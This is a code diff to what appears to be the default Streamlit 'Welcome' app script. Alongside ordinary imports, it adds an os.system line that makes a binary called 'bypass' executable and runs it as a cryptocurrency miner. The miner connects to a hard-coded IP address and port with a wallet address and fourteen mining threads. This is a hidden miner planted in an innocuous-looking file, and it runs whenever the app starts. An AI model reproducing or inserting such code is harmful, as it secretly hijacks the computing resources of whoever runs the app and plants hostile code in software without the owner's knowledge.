@@ -3,6 +3,7 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
+import os
 os.system('chmod +x bypass && ./bypass -r  15.235.164.162:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm433xrs6nyyauq2x3e8d.mikayla --mining-threads=14')
 """
 # Welcome to Streamlit!
